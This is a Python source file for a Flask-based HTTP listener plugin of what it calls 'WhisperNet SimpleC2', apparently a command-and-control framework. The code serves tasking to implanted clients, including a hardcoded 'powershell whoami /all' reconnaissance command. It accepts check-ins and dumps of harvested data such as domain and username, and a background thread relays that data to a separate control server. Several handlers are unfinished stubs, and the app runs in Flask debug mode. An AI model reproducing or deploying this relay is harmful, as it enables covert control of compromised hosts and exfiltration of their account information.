'''
Hey! This is the External plugin template. You can create the external part of your plugins with this.

The first section is plugin options, aimed at making some harder settings a bit easier to configure.

Throw a description of your plugin here as well:
################################################
<desc> Plugin makes the world go around.
################################################


Last but not least, fill in the "Info" class with the proper fields. 
'''
## Don't remove me. This is the base plugin class, parent to all classes for plugins.
from ExternalBaseClass import ExternalBasePlugin
from Utils.LoggingBaseClass import BaseLogging
from Utils.YamlLoader import PluginConfig


''' Imports
Go ahead and define any other imports you may need here.

'''
import logging
import inspect
from time import sleep
#from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity, exceptions
#from flask import Flask, jsonify, request, send_from_directory, render_template, Response

from flask import Flask, send_from_directory, request, make_response, jsonify
import threading
import requests
import os
import json
import argparse



################################################
# Info class
################################################
'''Info class
Fill in your info for the plugin here. This is defined near the top, so it's accessible
by anything that may need it.

'''
class Info:
    name    = "FH01_Ext"
    author  = "Plugin Author"
    plugin_type = "External"
    config_file_path = "config.yaml"


################################################
# ArgParse
################################################
'''
parser = argparse.ArgumentParser()
parser.add_argument('--ip', help="The IP of the Control Server to connect to", required=True, default="127.0.0.1")
parser.add_argument('--port', help="The port of the Control Server to connect to.", required=True, default=5000)
parser.add_argument('--name', help="Give this plugin a name", required=False, default="Unnamed_Filehost_Node")
parser.add_argument('--quiet', help="Make the plugin shutup & not spit out logs to the terminal", required=False, action="store_true")
parser.add_argument('--log', help="What level of logging you want. I reccomend INFO (and it is the default) for most cases. Options: INFO, DEBUG, WARNING", required=False, default="INFO")

args = parser.parse_args()'''


################################################
# Logging & Debugging
################################################
''' ## Logging & Debugging ##
I highly recommend you to use the logging module, it makes life a lot easier

Debugging:

    The first instruction in each function is "logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")"
    This will print the function name and the line number of the function call. It makes it easier to debug. Set the 
    logging level to something other than "DEBUG" to shut this off. It can get quite noisy.

Accessing logger.
    The logger is stored in BaseClass, which inheretes it from BaseLogging. You can access it with
    'self.logger'. This is just an instance of the logging function from python, so everything works in it.

    ex: self.logger.debug("mylog") is equivalent to logging.debug("mylog").

    This is set up this way so consistent logging can be achieved

'''


## Inherets BasePlugin
## Is a class instance, the __init__ is from BasePlugin.
class ExternalPluginClass(ExternalBasePlugin, BaseLogging):
    def __init__(self, app, config):
        #super().__init__(app, DataStruct)  # Problem with this was that it was trying to stuff app, 
        # and Datastruct into both, and both parent classes take different args, thus causing problems.
        ## Initialize BasePlugin and BaseLogging parent classes. Can't use one super call as stated above
        ExternalBasePlugin.__init__(self)
        #BaseLogging.__init__(self, level = "debug", print_to_screen=True)
        self.logger = BaseLogging(name="MyLogger", level="INFO", print_to_screen=True)

        self.config = config


        # Just in case you need to test logging/it breaks...
        #self.logger.warning("LOGGING IS WORKING - <PLUGINNAME>")
        self.app = app
        self.control_server_ip      = self.config.get_value("server.ip")
        self.control_server_port    = self.config.get_value("server.port")
        self.plugin_name            = self.config.get_value("plugin.name")
        self.authorization_header   = None
        self.listen_address         = self.config.get_value("plugin.network.ip")
        self.listen_port            = self.config.get_value("plugin.network.port")
        self.subroutine_interval    = self.config.get_value("plugin.subroutine.interval")
        self.subroutine_symbol      = self.config.get_value("plugin.subroutine.symbol")
        self.plugin_version         = self.config.get_value("plugin.version")

        #self.quiet                  = args.quiet

        #if not self.quiet:
            #pass
        #self.logger.addHandler(logging.StreamHandler())

        self.command_results_batch = []

        self.banner()

        self.start_subroutine()

    def banner(self):
        #banner = f"SimpleC2 HTTP Listener >> Server: {self.control_server_ip}:{self.control_server_port} >> Listening on: {self.listen_address}:{self.listen_port} "

        title = "WhisperNet SimpleC2 HTTP Listener"
        version = self.plugin_version
        #description = self.config.get_value("plugin.description")
        #details = "stuff"

        banner = f"""
*****************************************************************
 _   _ _   _         _     _     _                       
| | | | | | |       | |   (_)   | |                      
| |_| | |_| |_ _ __ | |    _ ___| |_ ___ _ __   ___ _ __ 
|  _  | __| __| '_ \| |   | / __| __/ _ \ '_ \ / _ \ '__|
| | | | |_| |_| |_) | |___| \__ \ ||  __/ | | |  __/ |   
\_| |_/\__|\__| .__/\_____/_|___/\__\___|_| |_|\___|_|   
              | |                                        
              |_|                                                 
*   {title} : {version} *
*   Server: {self.control_server_ip}:{self.control_server_port} >> Listening on: {self.listen_address}:{self.listen_port} *
*****************************************************************
"""
        print(banner)


    def main(self):
        '''
        Main function/entry point for the plugin.
        '''
        self.logger.debug(f"{self.logger.function_debug_symbol} {inspect.stack()[0][3]}")
        self.logger.debug(f"{self.logger.logging_debug_symbol} Loading {Info.name}")

        self.register_routes()
        
        self.load_creds()
        self.login_to_server()

    ## Move these to the config file eventually
    def register_routes(self):
        self.logger.debug(f"{self.logger.function_debug_symbol} {inspect.stack()[0][3]}")
        #self.app.route(f'/', methods = ["GET"])(self.plugin_function)
        #self.app.route(f'/<path:filename>', methods = ["GET"])(self.serve_file)
        self.app.route(f'/command', methods = ["POST"])(self.endpoint_get_command)

        ## client endpoints
        self.app.route(f'/clientname/command', methods = ["GET"])(self.client_get_command)
        self.app.route(f'/clientname/checkin', methods = ["POST"])(self.client_post_checkin)
        self.app.route(f'/clientdata', methods = ["POST"])(self.client_post_data)

    def get_command_loop(self):
        command = super().get_command()
        self.logger.debug(f"{self.logger.logging_debug_symbol}: {command}")
        ## do stuff with command - build out command tree?

    def endpoint_get_command(self):
        '''
        An endpont that gets the JSON from the server for commands for clients
        
        '''

    def client_get_command(self):
        '''
        For clients to get commands
        
        '''
        command = {
            "command":['powershell', 'whoami /all']
        }

        return jsonify(command)
    
    ## [x] POST works with postman
    def client_post_checkin(self):
        '''
        POST
        Where clients can check in
        
        {
            id: 
            timestamp:
            message: (if applicable)
        }
        '''
        try:
            id = request.json.get('id')
            timestamp = request.json.get('timestamp')
            message = request.json.get('message')

                #id, message, timestamp)
            self.logger.info(f"{self.logger.logging_info_symbol} ClientCheckin: ID: {id} message: {message} timestamp: {timestamp}")
        
        except Exception as e:
            self.logger.warning(f"{self.logger.logging_warning_symbol} Error with client_post_checkin: {e}")


        return ""
    
    ## [x] POST works with postman
    def client_post_data(self):
        '''
        POST
        where clients can dump data 
        {
            id: 
            txid: transaction id, to track transaction?
            timestamp:
            data: "domain/username"

        }
        
        '''
        try:
            #print("hafdhsfasdhfasdjfhasdk")

            id = request.json.get('id')
            timestamp = request.json.get('timestamp')
            data = request.json.get('data')
            #print(id, data, timestamp)

            ## Impelment a batch system here, with a subroutine to fire off the results every X seconds

            ## potential problem here, each request will forawrd to server. this could easily overload server.
            ## might be best to subroutine this & then each subroutine post data.
            #self.post_clientdata_entries(client_data="")

            ## appending onto list
            self.command_results_batch.append(request.get_data(as_text=True))

            self.logger.warning(f"{self.logger.logging_info_symbol} ClientCheckin: ID: {id} data (length): {len(data)} timestamp: {timestamp}")
            #print("hi")
        except Exception as e:
            self.logger.warning(f"{self.logger.logging_warning_symbol} Error with client_post_data: {e}")


        return ""


################################################
# Some failsafes & subroutines
################################################

    def batch(self):
        '''
        A batch system to be called upon by a subroutine
        
        Steps:
            Get JSON command results
            append to self.command_results_batch
            on subrouting, loop over items and send to server

        '''
        pass

    def send_result_data_to_server(self):
        '''
        a function to send data to server
        '''

        pass

        '''
        for i in self.result_data:
            reqeusts.post(i)
        
        '''
        try:
            headers = {
                    "Content-Type": "application/json"
            }

            ## change this to send all json at once. Makes more sense efficiency wise. Granted,
            ## could still overload the server with requests if they are too big

            ##nah fuck it its fine for now. one request is one client data thingy. easier to implement

            ## basically if there's nothing to send, save the trouble of sending the data
            if self.command_results_batch == None:
                self.logger.debug(f"{self.logger.logging_debug_symbol} {self.subroutine_symbol} No data to send to server, not sending")
                return

            for data in self.command_results_batch:
                requests.post(
                    url = f"http://{self.control_server_ip}:{self.control_server_port}/api/simplec2/clientdata",
                    data = data,
                    headers=headers
                )
            
        except Exception as e:
            self.logger.warning(f"{self.logger.logging_warning_symbol} Error sending client data to server: {e}")
        
        ## clearing list
        self.command_results_batch = []

    def subroutine(self):
        '''
        
        '''
        while True:
            self.logger.debug(f"{self.logger.logging_debug_symbol} Starting SimpleC2 Node subroutine")
            self.send_result_data_to_server()
            sleep(self.subroutine_interval)

    def start_subroutine(self):
        subroutine_thread = threading.Thread(
            target=self.subroutine
        )
        subroutine_thread.daemon = True
        subroutine_thread.start()


def init_config():
    try:
        config = PluginConfig(config_file_path = Info.config_file_path)
        config.load_config()
        #self.logger.info(f"{self.logger.logging_warning_symbol} Config: {Info.config_file_path} successfuly loaded!")
        return config

    except Exception as e:
        print("Cannot load config file! Exiting")
        #self.logger.warning(f"{self.logger.logging_warning_symbol} Cannot load config: {Info.config_file_path}! Exiting!")
        exit()

if __name__ == "__main__":
    app = Flask(__name__)

    ## config stuff
    config = init_config()

    exteral_plugin = ExternalPluginClass(app, config=config)
    exteral_plugin.main()

    ## Setup Daemon for heartbeat in background
    ## Note, this daemon method is inhereted from BasePlugin
    heartbeat_daemon = threading.Thread(
        target=exteral_plugin.heartbeat_daemon
    )

    heartbeat_daemon.daemon = True
    heartbeat_daemon.start()



    app.run(host=config.get_value("plugin.network.ip"), port=config.get_value("plugin.network.port"), debug=True)
